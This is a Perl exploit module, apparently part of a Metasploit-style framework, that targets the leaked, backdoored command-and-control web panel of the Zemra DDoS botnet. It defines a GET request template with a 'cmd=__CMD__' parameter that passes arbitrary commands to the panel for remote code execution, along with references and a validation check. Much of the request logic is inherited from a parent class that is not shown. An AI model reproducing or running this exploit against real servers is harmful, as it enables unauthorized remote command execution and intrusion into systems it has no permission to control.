package MSFExploits::Exploits::ZEMRA::MSF::ZemraPanelRce;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::ZEMRA);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "ZemraPanelRce";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

        This module exploits the CnC web panel of Zemra Botnet which contains a backdoor

        inside its leaked source code. Zemra is a crimeware bot that can be used to

        conduct DDoS attacks and is detected by Symantec as Backdoor.Zemra.

      ",
  METHOD => "GET",
  MSF_MODULE => "zemra_panel_rce",
  PATH => "cmd=__CMD__&",
  REFERENCES => [
    "http://0day.today/exploit/19259",
    "http://insecurety.net/?p=144",
    "http://www.symantec.com/connect/blogs/ddos-attacks-zemra-bot",
  ],
  TITLE => "Zemra Botnet CnC Web Panel Remote Code Execution",
  VARIABLES => {
    'CMD' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT6 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #6 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
